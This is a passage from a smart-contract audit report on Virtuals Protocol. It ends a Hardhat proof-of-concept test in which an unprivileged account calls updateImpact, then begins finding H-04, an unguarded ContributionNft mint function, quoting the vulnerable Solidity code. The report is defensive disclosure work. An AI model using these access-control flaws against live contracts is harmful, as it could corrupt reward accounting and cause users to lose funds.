<span class="grvsc-line"><span class="grvsc-source">    console.log(`AgentNftV2 deployed at ${agentNft.target}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deploying ContributionNft...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const contribution = await upgrades.deployProxy(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      await ethers.getContractFactory("ContributionNft"),</span></span>
<span class="grvsc-line"><span class="grvsc-source">      [agentNft.target],</span></span>
<span class="grvsc-line"><span class="grvsc-source">      {}</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`ContributionNft deployed at ${contribution.target}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deploying ServiceNft...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const service = await upgrades.deployProxy(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      await ethers.getContractFactory("ServiceNft"),</span></span>
<span class="grvsc-line"><span class="grvsc-source">      [agentNft.target, contribution.target, process.env.DATASET_SHARES],</span></span>
<span class="grvsc-line"><span class="grvsc-source">      {}</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`ServiceNft deployed at ${service.target}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentNft.setContributionService(contribution.target, service.target);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Set contribution and service on AgentNft");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Implementation contracts</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deploying AgentToken...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const agentToken = await ethers.deployContract("AgentToken");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentToken.waitForDeployment();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`AgentToken deployed at ${agentToken.target}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    </span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deploying AgentDAO...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const agentDAO = await ethers.deployContract("AgentDAO");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentDAO.waitForDeployment();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`AgentDAO deployed at ${agentDAO.target}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    </span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deploying AgentVeToken...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const agentVeToken = await ethers.deployContract("AgentVeToken");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentVeToken.waitForDeployment();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`AgentVeToken deployed at ${agentVeToken.target}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deploying AgentFactoryV2...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const agentFactory = await upgrades.deployProxy(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      await ethers.getContractFactory("AgentFactoryV2"),</span></span>
<span class="grvsc-line"><span class="grvsc-source">      [</span></span>
<span class="grvsc-line"><span class="grvsc-source">        agentToken.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        agentVeToken.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        agentDAO.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        tbaRegistry.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        virtualToken.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        agentNft.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        PROPOSAL_THRESHOLD,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        deployer.address,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      ]</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentFactory.waitForDeployment();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`AgentFactoryV2 deployed at ${agentFactory.target}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    </span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentNft.grantRole(await agentNft.MINTER_ROLE(), agentFactory.target);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Granted MINTER_ROLE to AgentFactory");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    </span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deploying Minter...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const minter = await upgrades.deployProxy(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      await ethers.getContractFactory("Minter"),</span></span>
<span class="grvsc-line"><span class="grvsc-source">      [</span></span>
<span class="grvsc-line"><span class="grvsc-source">        service.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        contribution.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        agentNft.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        1e12,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        20,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        ipVault.address,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        agentFactory.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        deployer.address,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        1e10,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      ]</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await minter.waitForDeployment();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`Minter deployed at ${minter.target}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Setting parameters on AgentFactory...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentFactory.setMaturityDuration(86400 * 365 * 10); // 10years</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentFactory.setUniswapRouter(process.env.UNISWAP_ROUTER);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentFactory.setTokenAdmin(deployer.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    </span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentFactory.setTokenSupplyParams(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.AGENT_TOKEN_LIMIT,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.AGENT_TOKEN_LP_SUPPLY,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.AGENT_TOKEN_VAULT_SUPPLY,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.AGENT_TOKEN_LIMIT,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.AGENT_TOKEN_LIMIT,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.BOT_PROTECTION,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      minter.target</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    </span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentFactory.setTokenTaxParams(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.TAX,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.TAX,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      process.env.SWAP_THRESHOLD,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      treasury.address</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("AgentFactory parameters set");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    return { virtualToken, agentFactory, agentNft, minter, tbaRegistry, service };</span></span>
<span class="grvsc-line"><span class="grvsc-source">  }</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">  async function deployWithApplication() {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const base = await deployBaseContracts();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { agentFactory, virtualToken, tbaRegistry } = base;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { founder } = await getAccounts();</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Prepare tokens for proposal</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Minting VirtualToken for founder...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await virtualToken.mint(founder.address, PROPOSAL_THRESHOLD);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await virtualToken</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .connect(founder)</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .approve(agentFactory.target, PROPOSAL_THRESHOLD);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">console.log("Proposing agent...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const tx = await agentFactory</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .connect(founder)</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .proposeAgent(</span></span>
<span class="grvsc-line"><span class="grvsc-source">        genesisInput.name,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        genesisInput.symbol,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        genesisInput.tokenURI,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        genesisInput.cores,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        genesisInput.tbaSalt,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        tbaRegistry.target,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        genesisInput.daoVotingPeriod,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        genesisInput.daoThreshold</span></span>
<span class="grvsc-line"><span class="grvsc-source">      );</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">      await tx.wait();</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    const filter = agentFactory.filters.NewApplication;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const events = await agentFactory.queryFilter(filter, -1);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const event = events[0];</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { id } = event.args;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`Agent application created with ID: ${id}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    </span></span>
<span class="grvsc-line"><span class="grvsc-source">    return { applicationId: id, ...base };</span></span>
<span class="grvsc-line"><span class="grvsc-source">  }</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">  async function deployWithAgent() {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const base = await deployWithApplication();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { agentFactory, applicationId } = base;</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { founder } = await getAccounts();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Executing application...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await agentFactory</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .connect(founder)</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .executeApplication(applicationId, false);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    const factoryFilter = agentFactory.filters.NewPersona;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const factoryEvents = await agentFactory.queryFilter(factoryFilter, -1);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const factoryEvent = factoryEvents[0];</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { virtualId, token, veToken, dao, tba, lp } = await factoryEvent.args;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`Agent created with virtualId: ${virtualId}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    return {</span></span>
<span class="grvsc-line"><span class="grvsc-source">      ...base,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      agent: {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        virtualId,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        token,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        veToken,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        dao,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        tba,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        lp,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      },</span></span>
<span class="grvsc-line"><span class="grvsc-source">    };</span></span>
<span class="grvsc-line"><span class="grvsc-source">  }</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">  before(async function () {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Increase timeout for all tests</span></span>
<span class="grvsc-line"><span class="grvsc-source">    this.timeout(60000);</span></span>
<span class="grvsc-line"><span class="grvsc-source">  });</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">it("Unfair updateImpact", async function () {</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { agent, agentNft, virtualToken, service} = await loadFixture(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      deployWithAgent</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { trader, poorMan, founder, randomAddr, deployer } = await getAccounts();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    </span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Update the impact</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await service.connect(trader).updateImpact(1n, 1n);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    </span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Old - DATASET_SHARES=7000 # 70%</span></span>
<span class="grvsc-line"><span class="grvsc-source">    expect(await service.datasetImpactWeight()).to.be.eq(7000n);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    </span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Change the datasetImpactWeight</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Setting to 8000</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await service.connect(deployer).setDatasetImpactWeight(8000n);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    expect(await service.datasetImpactWeight()).to.be.eq(8000n);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    </span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Again updating impact should work</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await service.connect(trader).updateImpact(1n, 1n);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">  });</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">});</span></span></code></pre>
</details>
<p><strong>Virtuals marked as informative</strong></p>
<hr>
<h2 style="position:relative;" id="h-04-public-contributionnftmint-leads-to-cascading-issues--loss-of-funds"><a class="anchor before" aria-label="h 04 public contributionnftmint leads to cascading issues  loss of funds permalink" href="#h-04-public-contributionnftmint-leads-to-cascading-issues--loss-of-funds"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-54">[H-04] Public <code>ContributionNft::mint</code> leads to cascading issues / loss of funds</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-560">YouCrossTheLineAlfie</a>, also found by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-797">axelot</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-249">DarkeEEandMe</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-331">Legend</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-49">mbuba666</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-175">RaOne</a>, and <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-107">sergei2340</a></em></p>
<p>The contributors are supposed to submit their proposals via frontend and it is assumed from the <a href="https://whitepaper.virtuals.io/about-virtuals-1/the-protocol/co-contribution-and-provenance/modular-consensus-framework">docs</a>, that the frontend calls the <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ContributionNft.sol#L65"><code>ContributionNft::mint</code></a> function to mint as per the proposed proposal.</p>
<pre data-index="14" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">Contribution Process: Contributors submit their proposals through our frontend, utilizing the modular consensus framework. Each proposal generates a contribution NFT regardless of acceptance, authenticating the submission's origin.</span></span></code></pre>
<p>However, the <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ContributionNft.sol#L65"><code>ContributionNft::mint</code></a> is un-gaurded, allowing proposers to mint their own NFTs.</p>
<pre data-index="15" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">mint</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">virtualId</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint8</span><span class="mtk1"> </span><span class="mtk12">coreId</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">string</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">newTokenURI</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">proposalId</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">parentId</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">bool</span><span class="mtk1"> </span><span class="mtk12">isModel_</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">datasetId</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    ) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">IGovernor</span><span class="mtk1"> </span><span class="mtk12">personaDAO</span><span class="mtk1"> = </span><span class="mtk11">getAgentDAO</span><span class="mtk1">(</span><span class="mtk12">virtualId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">msg</span><span class="mtk1">.</span><span class="mtk12">sender</span><span class="mtk1"> == </span><span class="mtk12">personaDAO</span><span class="mtk1">.</span><span class="mtk11">proposalProposer</span><span class="mtk1">(</span><span class="mtk12">proposalId</span><span class="mtk1">),</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk8">"Only proposal proposer can mint Contribution NFT"</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">parentId</span><span class="mtk1"> != </span><span class="mtk12">proposalId</span><span class="mtk1">, </span><span class="mtk8">"Cannot be parent of itself"</span><span class="mtk1">);</span></span></span></code></pre>
<p>An issue arises here when these proposers are able to pass in incorrect/bogus values of incorrect <code>coreId</code>, <code>newTokenURI</code>, <code>parentId</code>, <code>isModel_</code> and <code>datasetId</code>.</p>
<h3 style="position:relative;" id="impact-1"><a class="anchor before" aria-label="impact 1 permalink" href="#impact-1"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<ol>
<li>Incorrect cores and model values inside the <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L58C14-L58C18"><code>ServiceNft::mint</code></a> function, leading to incorrect <code>serviceNFT</code> mint:</li>
</ol>
<pre data-index="16" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">mint</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">virtualId</span><span class="mtk1">, </span><span class="mtk12">bytes32</span><span class="mtk1"> </span><span class="mtk12">descHash</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// . . . Rest of the code . . .</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">proposalId</span><span class="mtk1"> = </span><span class="mtk12">personaDAO</span><span class="mtk1">.</span><span class="mtk11">hashProposal</span><span class="mtk1">(</span><span class="mtk12">targets</span><span class="mtk1">, </span><span class="mtk12">values</span><span class="mtk1">, </span><span class="mtk12">calldatas</span><span class="mtk1">, </span><span class="mtk12">descHash</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">_mint</span><span class="mtk1">(</span><span class="mtk12">info</span><span class="mtk1">.</span><span class="mtk12">tba</span><span class="mtk1">, </span><span class="mtk12">proposalId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">_cores</span><span class="mtk1">[</span><span class="mtk12">proposalId</span><span class="mtk1">] = </span><span class="mtk11">IContributionNft</span><span class="mtk1">(</span><span class="mtk12">contributionNft</span><span class="mtk1">).</span><span class="mtk11">getCore</span><span class="mtk1">(</span><span class="mtk12">proposalId</span><span class="mtk1">);     &lt;&lt;@ -- </span><span class="mtk3">// Incorrect core set</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Calculate maturity</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">_maturities</span><span class="mtk1">[</span><span class="mtk12">proposalId</span><span class="mtk1">] = </span><span class="mtk11">IAgentDAO</span><span class="mtk1">(</span><span class="mtk12">info</span><span class="mtk1">.</span><span class="mtk12">dao</span><span class="mtk1">).</span><span class="mtk11">getMaturity</span><span class="mtk1">(</span><span class="mtk12">proposalId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">bool</span><span class="mtk1"> </span><span class="mtk12">isModel</span><span class="mtk1"> = </span><span class="mtk11">IContributionNft</span><span class="mtk1">(</span><span class="mtk12">contributionNft</span><span class="mtk1">).</span><span class="mtk11">isModel</span><span class="mtk1">(</span><span class="mtk12">proposalId</span><span class="mtk1">);               &lt;&lt;@ -- </span><span class="mtk3">// Incorrect model</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">isModel</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">CoreServiceUpdated</span><span class="mtk1">(</span><span class="mtk12">virtualId</span><span class="mtk1">, </span><span class="mtk12">_cores</span><span class="mtk1">[</span><span class="mtk12">proposalId</span><span class="mtk1">], </span><span class="mtk12">proposalId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk11">updateImpact</span><span class="mtk1">(</span><span class="mtk12">virtualId</span><span class="mtk1">, </span><span class="mtk12">proposalId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">_coreServices</span><span class="mtk1">[</span><span class="mtk12">virtualId</span><span class="mtk1">][</span><span class="mtk12">_cores</span><span class="mtk1">[</span><span class="mtk12">proposalId</span><span class="mtk1">]] = </span><span class="mtk12">proposalId</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        } </span><span class="mtk15">else</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">_coreDatasets</span><span class="mtk1">[</span><span class="mtk12">virtualId</span><span class="mtk1">][</span><span class="mtk12">_cores</span><span class="mtk1">[</span><span class="mtk12">proposalId</span><span class="mtk1">]].</span><span class="mtk11">push</span><span class="mtk1">(</span><span class="mtk12">proposalId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// . . . Rest of the code . . .</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<ol start="2">
<li>Incorrect <code>datasetId</code> would overwrite someone else’s values as well as incorrect <code>_impacts</code> calculated for both <code>proposalId</code> and <code>datasetId</code> can be seen inside the <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L90"><code>ServiceNft::updateImpact</code></a>:</li>
</ol>
<pre data-index="17" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">updateImpact</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">virtualId</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">proposalId</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">       </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">       </span><span class="mtk3">// . . . Rest of the code . . .</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
